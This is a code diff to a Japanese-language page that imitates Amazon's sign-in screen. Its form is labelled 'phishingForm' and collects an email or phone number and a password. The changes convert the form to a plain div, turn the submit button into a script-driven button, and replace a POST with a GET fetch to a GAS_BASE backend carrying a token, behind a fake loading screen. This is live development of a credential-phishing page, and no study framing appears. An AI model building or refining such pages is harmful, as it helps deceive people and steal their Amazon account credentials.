@@ -140,7 +140,7 @@
 
     <div class="login-container">
       <h1>サインイン</h1>
-      <form id="phishingForm" action="" method="POST">
+      <div id="phishingForm">
         <div class="form-group">
           <label for="userId" class="form-label">Eメールまたは携帯電話番号</label>
           <input type="text" id="userId" name="userId" class="form-input">
@@ -151,12 +151,12 @@
           <input type="password" id="password" name="password" class="form-input">
         </div>
   
-        <button type="submit" class="submit-button" id="submitBtn">サインイン</button>
+        <button type="button" class="submit-button" id="submitBtn">サインイン</button>
   
         <div class="note-text">
           サインインすることで、Amazonの利用規約、プライバシー規約に同意したものとみなされます。
         </div>
-      </form>
+      </div>
     </div>
 
     <div id="loading-container" class="hidden">
@@ -202,14 +202,7 @@
           document.getElementById('login-container').classList.add('hidden');
 
           setTimeout(() => {
-            // (C) 3秒後にfetchでPOST
-            const formData = new FormData();
-            formData.append('token', token);
-
-            fetch(`${GAS_BASE}?mode=form&token=${encodeURIComponent(token)}`, {
-              method: 'POST',
-              body: formData
-            })
+            fetch(`${GAS_BASE}?mode=form&token=${encodeURIComponent(token)}`)
             .then(res => res.text())
             .then(html => {
               console.log("Form submit response:", html);
